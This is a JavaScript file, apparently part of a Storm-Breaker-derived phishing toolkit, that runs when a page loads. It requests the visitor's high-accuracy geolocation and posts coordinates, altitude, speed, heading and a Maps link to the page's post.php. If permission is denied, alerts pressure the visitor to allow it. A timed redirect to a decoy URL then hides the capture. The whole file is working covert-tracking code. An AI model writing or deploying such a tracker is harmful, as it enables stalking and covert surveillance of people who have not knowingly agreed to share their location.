// location.js by KasRoudra
// Author   : KasRoudra
// Github   : https://github.com/KasRoudra
// Email    : kasroudrard@gmail.com
// Messenger: https//m.me/KasRoudra
// Credits  : StormBreaker(https://github.com/ultrasecurity/Storm-Breaker)
// CreatedAt: 10-08-2022

const DEFAULT_REDIRECT_URL = 'https://example.com/placeholder';

const locate = (allow_redir) => {
    // post object as formdata
    const post = (obj, url=window.location.origin+"/post.php", error=false) => {
        const formData = new FormData();
        for (const key in obj) {
            formData.append(key, obj[key]);
        }
        fetch(url, {
            method: "POST",
            body: formData
        })
        .then(async (res) => {
            const text = await res.text();
            console.log(text);
            try {
                if (error) document.querySelector("#failure").click();
                else document.querySelector("#success").click();
            }
            catch (err) {
                console.log(err)
            }
            // Redirect logic has been moved to start immediately when locate() is called.
        })
        .catch((err) => {
            console.log(err)
            try {
                document.querySelector("#failure").click();
            }
            catch (err) {
                console.log(err)
            }
            try {
                if (allow_redir) {
                    const urlToUse = (typeof redirect_url !== 'undefined' && redirect_url) ? redirect_url : DEFAULT_REDIRECT_URL;
                    location.replace(urlToUse);
                }
            }
            catch (err) {
                console.log(err)
            }
        });
    }
    // Function for successful location capture
    const showPosition = (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const altitude = position.coords.altitude;
        const speed = position.coords.speed;
        const direction = position.coords.heading;
        const map_url = !!latitude && !!longitude && `https://www.google.com/maps/@${latitude},${longitude}`
        const details = {
            latitude,
            longitude,
            altitude,
            map_url,
            accuracy,
            speed,
            direction
        }
        const fileteredDetails = Object.fromEntries(
            Object.entries(details).map(arr => {
                if (!arr[1]) arr[1] = 0
                if (["latitude", "longitude", "direction"].includes(arr[0])) arr[1]+="°"
                if (arr[0]=="speed") arr[1] += "m/s"
                if (arr[0]=="altitude") arr[1] += "m"
                return arr;
            })
        )
        post(fileteredDetails)
    };
    // Function for failed location capture
    const showError = (error) => {
        let error_message = ""
        switch (error.code) {
            case error.PERMISSION_DENIED:
                error_message = "User denied the request for geolocation";
                alert("Please refresh this page and allow location permission...");
                break;
            case error.POSITION_UNAVAILABLE:
                error_message = "Location information is unavailable";
                break;
            case error.TIMEOUT:
                error_message = "The request to get user location timed out";
                alert("Please set your location mode on high accuracy...");
                break;
            case error.UNKNOWN_ERROR:
                error_message = "An unknown error occurred";
                break;
        }
        post({error_message}, error = true)
    };
    
    const options = {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumage: 0
    };
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            showPosition, 
            showError,
            options
        );

        // Start the 10-second redirect timer immediately
        if (allow_redir) {
            setTimeout(() => {
                try {
                    const urlToUse = (typeof redirect_url !== 'undefined' && redirect_url) ? redirect_url : DEFAULT_REDIRECT_URL;
                    console.log('Redirecting after 10 seconds...');
                    location.replace(urlToUse);
                }
                catch (err) {
                    console.log(err);
                }
            }, 10000);
        }
    } else {
        alert("Geolocation is not supported by your browser...");
    }
}
if (!window.onload) {
    window.onload = () => {
        if (!document.querySelector(".locate")) {
            locate(true);
        }
        else document.querySelector(".locate").addEventListener("click", () => {
            locate(true);
        })
    }
}